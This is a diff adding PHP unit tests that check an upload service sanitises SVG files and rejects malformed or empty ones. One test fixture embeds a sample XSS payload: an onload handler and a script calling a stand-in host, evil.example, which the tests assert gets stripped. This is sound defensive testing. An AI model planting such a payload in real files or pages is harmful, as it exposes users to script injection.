@@ -150,4 +150,84 @@ class FileUploadServiceTest extends TestCase
 
         $this->assertSame('image/jpeg', $result['mimeType']);
     }
+
+    private function tempFile(string $content): string
+    {
+        $path = tempnam(sys_get_temp_dir(), 'svg-test');
+        $this->assertIsString($path);
+        file_put_contents($path, $content);
+
+        return $path;
+    }
+
+    private function svgUploadedFile(string $path): UploadedFile
+    {
+        $file = $this->createMock(UploadedFile::class);
+        $file->method('isValid')->willReturn(true);
+        $file->method('getClientOriginalName')->willReturn('icon.svg');
+        $file->method('getClientOriginalExtension')->willReturn('svg');
+        $file->method('getClientMimeType')->willReturn('image/svg+xml');
+        $file->method('getMimeType')->willReturn('image/svg+xml');
+        $file->method('getSize')->willReturn((int) filesize($path));
+        $file->method('getPathname')->willReturn($path);
+
+        return $file;
+    }
+
+    #[Test]
+    public function uploadSanitizesSvgAndStripsScripts(): void
+    {
+        $path = $this->tempFile(
+            '<svg xmlns="http://www.w3.org/2000/svg" onload="alert(1)">'
+            . '<script>fetch("https://evil.example/x")</script>'
+            . '<circle cx="10" cy="10" r="5"/></svg>',
+        );
+
+        $stored = null;
+        $this->storage
+            ->expects($this->once())
+            ->method('write')
+            ->with(
+                $this->callback(static fn($filename) => str_ends_with($filename, '.svg')),
+                $this->callback(static function (string $content) use (&$stored) {
+                    $stored = $content;
+
+                    return true;
+                }),
+            );
+
+        $result = $this->service->upload($this->svgUploadedFile($path));
+
+        $this->assertSame('image/svg+xml', $result['mimeType']);
+        $this->assertIsString($stored);
+        $this->assertStringNotContainsString('<script', $stored);
+        $this->assertStringNotContainsString('onload', $stored);
+        $this->assertStringContainsString('<circle', $stored);
+    }
+
+    #[Test]
+    public function uploadRejectsSvgThatSanitizesToEmpty(): void
+    {
+        $path = $this->tempFile('');
+
+        $this->storage->expects($this->never())->method('write');
+
+        $this->expectException(\InvalidArgumentException::class);
+        $this->expectExceptionMessage('Le fichier SVG est invalide ou a été rejeté après analyse.');
+
+        $this->service->upload($this->svgUploadedFile($path));
+    }
+
+    #[Test]
+    public function uploadRejectsMalformedSvg(): void
+    {
+        $path = $this->tempFile('<svg><broken');
+
+        $this->storage->expects($this->never())->method('write');
+
+        $this->expectException(\InvalidArgumentException::class);
+        $this->expectExceptionMessage('Le fichier SVG est invalide ou a été rejeté après analyse.');
+
+        $this->service->upload($this->svgUploadedFile($path));
+    }
 }
